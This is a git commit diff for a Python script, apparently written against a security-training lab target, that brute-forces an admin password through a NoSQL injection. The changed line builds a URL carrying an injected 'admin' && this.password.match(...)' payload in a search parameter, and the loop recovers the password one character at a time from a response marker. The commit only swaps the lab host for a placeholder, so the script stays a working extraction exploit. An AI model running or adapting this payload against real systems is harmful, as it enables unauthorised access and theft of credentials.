0380867a8ca7411a135bcf6e9b840243d017d240
Jordani Jean-Pierre <jpshomelab@gmail.com>
2022-11-05 12:48:01 -0400

    updated name and edited script to indicate what values must be changed

--- urlbruteforce.py
+++ urlbruteforce.py
@@ -9,7 +9,7 @@ flag = 1
 while flag == 1:
     flag = 0
     for l in list:
-        url = 'https://ptl-3a03d9c5-d28288ff.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^' + result + l + '.*$/)%00'
+        url = 'https://' + 'url' + '/?search=admin%27%20%26%26%20this.password.match(/^' + result + l + '.*$/)%00'
         r = requests.get(url, data = myobj, proxies = { "http" : "127.0.0.1:8080"})
         if ('<tr><td><a href="?search=admin">admin</a></td></tr>' in r.text):
             result += l
